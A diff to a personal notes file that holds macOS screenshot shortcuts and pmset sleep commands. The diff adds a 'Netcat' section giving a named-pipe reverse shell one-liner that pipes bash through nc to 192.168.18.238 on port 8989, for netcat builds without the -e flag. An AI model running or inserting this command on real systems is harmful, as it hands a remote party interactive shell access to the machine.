@@ -1,5 +1,4 @@
 # Screenshots
-
 ## OS X
 - Command-Shift-3: Full screen to desktop
 - Command-Shift-4, select an area: Area to desktop
@@ -12,4 +11,10 @@
 - Temporarily turn off sleep: *sudo pmset noidle*
 - Turn off sleep: *sudo pmset sleep 0*
 - Sleep after 15 minutes: *sudo pmset sleep 15*
+
+# Netcat
+- When -e flag does not exist:
+
+mknod /tmp/datapipe p
+/bin/bash 0</tmp/datapipe |nc 192.168.18.238 8989 1>/tmp/datapipe
 
